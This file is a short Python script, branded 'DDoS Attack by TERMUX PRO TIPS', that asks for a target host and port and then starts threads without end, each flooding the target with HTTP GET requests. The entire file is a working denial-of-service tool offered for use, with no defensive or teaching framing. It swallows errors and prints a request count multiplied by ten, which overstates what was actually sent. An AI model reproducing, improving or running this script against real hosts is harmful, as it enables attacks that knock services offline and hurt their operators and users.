import requests
from threading import Thread
import os

os.system("clear")

print("""

 ######     ######            #######
 ##    ##   ##    ##          ##
 ##     ##  ##     ##  #####  #######
 ##     ##  ##     ##  #   #       ##
 ##    ##   ##    ##   #   #       ##
 ######     ######     #####  #######

 ##### ##### ##### ##### ##### #   #
 #   #   #     #   #   # #     # #
 #####   #     #   ##### #     #  #
 #   #   #     #   #   # ##### #   #

 by TERMUX PRO TIPS.

 ===================================
 ===================================
""")

HOST = input(" [::] Target HOST: ")
PORT = input(" [::] Target PORT: ")

sent_count = 0

def ddos():
    
    global sent_count

    while True:
        try:
            r = requests.get("http://{}:{}".format(HOST, PORT))
            sent_count += 1
            if str(r.status_code) != "200":
                print(r.status_code)
        except:
            pass
print()
while True:
    Thread(target=ddos).start()
    print(f" [::] Sent {sent_count * 10} requests", end="\r")
